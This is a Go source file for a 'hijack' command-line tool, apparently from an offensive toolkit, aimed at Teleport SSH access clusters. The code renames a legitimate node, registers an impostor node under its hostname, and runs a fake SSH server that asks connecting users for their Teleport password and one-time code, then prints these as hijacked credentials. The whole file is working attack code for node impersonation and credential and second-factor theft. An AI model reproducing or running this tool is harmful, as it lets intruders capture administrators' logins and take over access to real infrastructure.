package cli

import (
	"context"
	"fmt"
	"time"

	gssh "github.com/gliderlabs/ssh"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh/terminal"
	api "xpnsec.com/node-hijack/v2/pkg/api"
	sshserver "xpnsec.com/node-hijack/v2/pkg/ssh"
	"xpnsec.com/shared/v2/pkg/connection"
)

var nodeId string
var clientSSHCert string
var ctx context.Context
var cancel context.CancelFunc
var connectionOptions connection.Options
var hostSSHCert string
var hostSSHKey string

func sleep(ctx context.Context, duration time.Duration) error {
	timer := time.NewTimer(duration)
	defer timer.Stop()

	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}

var HijackCmd = &cobra.Command{
	Use:   "hijack",
	Short: "Hijack a node",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		client, err := api.NewClient(connectionOptions.ClientCert, connectionOptions.ClientKey, connectionOptions.Proxy, connectionOptions.ClusterName)
		if err != nil {
			panic(err)
		}

		node, err := client.GetNode(ctx, nodeId)
		if err != nil {
			panic(err)
		}

		go func(ctx context.Context) {
			oldHostname := node.Spec.Hostname

			for {
				select {
				case <-ctx.Done():
					fmt.Println("[*] Cleaning up node...")
					err = client.DeleteNode(context.Background(), oldHostname)
					if err != nil {
						panic(err)
					}
					return

				default:
					// We need to rename the old hostname so we can capture others connecting to it
					node.Spec.Hostname = fmt.Sprintf("%s-archived", oldHostname)
					client.UpdateNode(context.Background(), node)
					fmt.Printf("[*] Renaming hostname: %s to %s\n", oldHostname, node.Spec.Hostname)

					fmt.Printf("[*] Adding Node to hijack: %s\n", oldHostname)
					// Now we can create our new node which will receive connections
					err = client.UpsertNode(context.Background(), oldHostname)
					if err != nil {
						panic(err)
					}
					fmt.Printf("[*] Hijacked Node: %s\n", oldHostname)
					sleep(ctx, time.Second*20)
				}
			}
		}(ctx)

		go func(ctx context.Context) {
			server := sshserver.NewSSHServer(hostSSHCert, hostSSHKey)
			fmt.Printf("[*] SSH Server Started on port 2223\n")
			err := server.Start(func(s gssh.Session) {

				term := terminal.NewTerminal(s, "")

				term.Write([]byte(fmt.Sprintf("Enter password for Teleport user %s: ", s.User())))

				password, err := term.ReadPassword("")
				if err != nil {
					return
				}
				term.Write([]byte("Enter an OTP code from a device: "))
				otp, err := term.ReadPassword("")
				if err != nil {
					return
				}

				fmt.Printf("[\\o/] New credentials hijacked: user=%s password=%s otp=%s\n", s.User(), password, otp)
			})
			if err != nil {
				panic(err)
			}
		}(ctx)

		fmt.Println("[*] Press Enter to clean up...")

		fmt.Scanln()

		cancel()

		fmt.Println("[*] Cleaning up in 10 seconds...")
		time.Sleep(10 * time.Second)
	},
}

func init() {
	ctx, cancel = context.WithCancel(context.Background())

	HijackCmd.Flags().StringVarP(&clientSSHCert, "client-ssh-cert", "s", "", "Existing SSH Cert")
	HijackCmd.Flags().StringVarP(&nodeId, "node-id", "n", "", "Node ID")
	HijackCmd.Flags().StringVarP(&hostSSHCert, "host-ssh-cert", "", "", "Host SSH Cert")
	HijackCmd.Flags().StringVarP(&hostSSHKey, "host-ssh-key", "", "", "Host SSH Key")

	connectionOptions.AddProxyFlag(HijackCmd.Flags())
	connectionOptions.AddClientCredentialFlags(HijackCmd.Flags())
	connectionOptions.AddClusterNameFlag(HijackCmd.Flags())
	HijackCmd.MarkFlagRequired("node-id")
	HijackCmd.MarkFlagRequired("client-ssh-cert")
	HijackCmd.MarkFlagRequired("proxy")
	HijackCmd.MarkFlagRequired("client-cert")
	HijackCmd.MarkFlagRequired("client-key")
	HijackCmd.MarkFlagRequired("cluster-name")
	HijackCmd.MarkFlagRequired("host-ssh-cert")
	HijackCmd.MarkFlagRequired("host-ssh-key")
}
